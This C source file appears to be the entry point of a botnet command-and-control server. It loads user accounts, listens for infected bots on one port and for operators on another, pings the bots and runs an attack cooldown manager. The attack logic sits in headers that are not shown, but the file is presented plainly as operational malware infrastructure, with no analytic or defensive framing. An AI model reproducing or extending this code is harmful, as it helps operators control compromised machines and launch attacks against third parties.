#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include "headers/login_utils.h"
#include "headers/user_handler.h"
#include "headers/botnet.h"

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Bad argument\n");
        return 1;
    }

    load_users();

    pthread_t bot_listener_thread, cnc_listener_thread, ping_thread, cooldown_thread;
    int botport = atoi(argv[1]);
    int cncport = atoi(argv[3]);

    pthread_create(&bot_listener_thread, NULL, bot_listener, &botport);
    pthread_create(&cnc_listener_thread, NULL, cnc_listener, &cncport);
    pthread_create(&ping_thread, NULL, ping_bots, NULL);
    pthread_create(&cooldown_thread, NULL, manage_cooldown, NULL);

    pthread_join(bot_listener_thread, NULL);
    pthread_join(cnc_listener_thread, NULL);
    pthread_join(ping_thread, NULL);
    pthread_join(cooldown_thread, NULL);

    return 0;
}
